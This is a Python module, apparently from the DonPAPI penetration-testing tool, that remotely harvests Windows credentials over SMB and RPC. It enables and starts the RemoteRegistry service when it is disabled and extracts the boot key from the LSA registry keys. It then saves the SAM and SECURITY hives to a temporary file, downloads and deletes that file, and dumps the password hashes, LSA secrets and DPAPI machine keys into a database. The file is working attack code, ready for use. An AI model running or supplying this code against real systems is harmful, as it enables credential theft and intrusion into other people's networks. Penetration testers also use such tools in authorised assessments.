from binascii import unhexlify
import logging
import ntpath
import time
from six import b
import exrex

from impacket.dcerpc.v5 import transport, rrp, scmr
from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ
from impacket.examples.secretsdump import LSASecrets, SAMHashes

from donpapi.lib.config import DEFAULT_CUSTOM_SHARE, DEFAULT_FILE_EXTENSION, DEFAULT_FILENAME_REGEX, DEFAULT_REMOTE_FILEPATH

class SAMDump:
    def __init__(self, remote_ops, bootkey) -> None:
        self.remote_ops = remote_ops
        self.bootkey = bootkey

        self.sam = None
        self.items_found = None

    def dump(self):
        logging.getLogger("impacket").disabled = True
        SAMFileName = self.remote_ops.saveSAM()
        self.sam = SAMHashes(samFile = SAMFileName, bootKey = self.bootkey, isRemote = True, perSecretCallback = self.idle)
        self.sam.dump()
        self.items_found = self.sam._SAMHashes__itemsFound
        self.sam.finish()

    def save_to_db(self, db, hostname):
        for sam_entry in self.items_found.values():
            db.add_samhash(sam_entry, hostname)

    def idle(self, _):
        pass

class LSADump:
    def __init__(self, remote_ops, bootkey) -> None:
        self.remote_ops = remote_ops
        self.bootkey = bootkey

        self.lsa = None
        self.secrets = None

    def dump(self):
        logging.getLogger("impacket").disabled = True
        SECURITYFileName = self.remote_ops.saveSECURITY()
        self.lsa = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True, perSecretCallback = self.idle)
        self.lsa.dumpSecrets()
        self.secrets = self.lsa._LSASecrets__secretItems
        self.lsa.finish()

    def get_dpapiSystem_keys(self):
        dpapiSystem = {}
        for secret in self.secrets:
            if secret.startswith("dpapi_machinekey:"):
                machineKey, userKey = secret.split('\n')
                machineKey = machineKey.split(':')[1]
                userKey = userKey.split(':')[1]
                dpapiSystem['MachineKey'] = unhexlify(machineKey[2:])
                dpapiSystem['UserKey'] = unhexlify(userKey[2:])
                return dpapiSystem
            
    def save_secrets_to_db(self, db, hostname):
        for lsa_secret in self.secrets:
            if lsa_secret.count(':')==1:
                username, password = lsa_secret.split(':')
                if username not in ['dpapi_machinekey', 'dpapi_userkey', 'NL$KM']:
                    db.add_secret(computer=hostname, windows_user="SYSTEM", username=username, password=password, collector="LSA")
            
    def idle(self, _, _2):
        pass

class RemoteFile:
    def __init__(self, smbConnection, fileName, shareName:str = "ADMIN$"):
        self.__smbConnection = smbConnection
        self.__fileName = fileName
        self.__shareName = shareName
        self.__tid = self.__smbConnection.connectTree(self.__shareName)
        self.__fid = None
        self.__currentOffset = 0

    def open(self):
        tries = 0
        while True:
            try:
                self.__fid = self.__smbConnection.openFile(self.__tid, self.__fileName, desiredAccess=FILE_READ_DATA,
                                                   shareMode=FILE_SHARE_READ)
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    if tries >= 3:
                        raise e
                    # Stuff didn't finish yet.. wait more
                    time.sleep(5)
                    tries += 1
                    pass
                else:
                    raise e
            else:
                break

    def seek(self, offset, whence):
        # Implement whence, for now it's always from the beginning of the file
        if whence == 0:
            self.__currentOffset = offset

    def read(self, bytesToRead):
        if bytesToRead > 0:
            data =  self.__smbConnection.readFile(self.__tid, self.__fid, self.__currentOffset, bytesToRead)
            self.__currentOffset += len(data)
            return data
        return b''

    def close(self):
        if self.__fid is not None:
            self.__smbConnection.closeFile(self.__tid, self.__fid)
            self.__smbConnection.deleteFile(self.__shareName, self.__fileName)
            self.__fid = None

    def tell(self):
        return self.__currentOffset

class DonPAPIRemoteOperations:
    def __init__(self, smb_connection, logger, share_name:str = DEFAULT_CUSTOM_SHARE, remote_filepath:str = DEFAULT_REMOTE_FILEPATH, file_extension:str = DEFAULT_FILE_EXTENSION, filename_regex:str = DEFAULT_FILENAME_REGEX) -> None:
        self.smb_connection = smb_connection
        self.logger = logger

        self.share_name = share_name
        self.file_extension = file_extension
        self.filename_regex = filename_regex
        self.remote_filepath = remote_filepath



        self.__scmr = None
        self.__scManagerHandle = None
        self.__serviceName = 'RemoteRegistry'
        self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
        self.__stringBindingSvcCtl = r'ncacn_np:445[\pipe\svcctl]'
        self.__rrp = None
        self.__regHandle = None
        self.bootkey = b''

    def enableRegistry(self):
        self.__connectSvcCtl()
        self.__checkServiceStatus()
        self.__connectWinReg()

    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
        rpc.set_smb_connection(self.smb_connection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __connectWinReg(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
        rpc.set_smb_connection(self.smb_connection)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def __checkServiceStatus(self):
        # Open SC Manager
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        # Now let's open the service
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        # Let's check its status
        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            # LOG.info('Service %s is in stopped state'% self.__serviceName)
            self.__shouldStop = True
            self.__started = False
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            # LOG.debug('Service %s is already running'% self.__serviceName)
            self.__shouldStop = False
            self.__started  = True
        else:
            raise Exception('Unknown service state 0x%x - Aborting' % ans['CurrentState'])

        # Let's check its configuration if service is stopped, maybe it's disabled :s
        if self.__started is False:
            ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
            if ans['lpServiceConfig']['dwStartType'] == 0x4:
                # LOG.info('Service %s is disabled, enabling it'% self.__serviceName)
                self.__disabled = True
                scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
            # LOG.info('Starting service %s' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
            time.sleep(1)

    def getBootKey(self):
        bootKey = b''
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']
        for key in ['JD','Skew1','GBG','Data']:
            # LOG.debug('Retrieving class info for %s'% key)
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
            keyHandle = ans['phkResult']
            ans = rrp.hBaseRegQueryInfoKey(self.__rrp,keyHandle)
            bootKey = bootKey + b(ans['lpClassOut'][:-1])
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

        transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

        bootKey = unhexlify(bootKey)
        for i in range(len(bootKey)):
            self.bootkey += bootKey[transforms[i]:transforms[i]+1]

        # LOG.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey).decode('utf-8'))

        return self.bootkey
    
    def saveSAM(self):
        self.logger.verbose("Saving remote SAM database")
        return self.__retrieveHive("SAM")

    def saveSECURITY(self):
        self.logger.verbose("Saving remote SECURITY database")
        return self.__retrieveHive("SECURITY")
    
    def __retrieveHive(self, hiveName):
        tmpFileName = exrex.getone(self.filename_regex) + self.file_extension
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hiveName)
        except Exception:
            raise Exception("Can't open %s hive" % hiveName)
        keyHandle = ans['phkResult']
        tmpFilePath = ntpath.join(self.remote_filepath, tmpFileName)
        self.logger.verbose(f"RegSave on filepath: ..{tmpFilePath}")
        rrp.hBaseRegSaveKey(self.__rrp, keyHandle, ntpath.join('..',tmpFilePath))
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
        # Now let's open the remote file, so it can be read later
        self.logger.verbose(f"Downloading hive on share: {self.share_name} on filepath: {tmpFilePath}")
        remoteFileName = RemoteFile(self.smb_connection, tmpFilePath, shareName=self.share_name)
        return remoteFileName
    
    def getDefaultLoginAccount(self):
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
            keyHandle = ans['phkResult']
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
            username = dataValue[:-1]
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultDomainName')
            domain = dataValue[:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
            if len(domain) > 0:
                return '%s\\%s' % (domain,username)
            else:
                return username
        except:
            return None
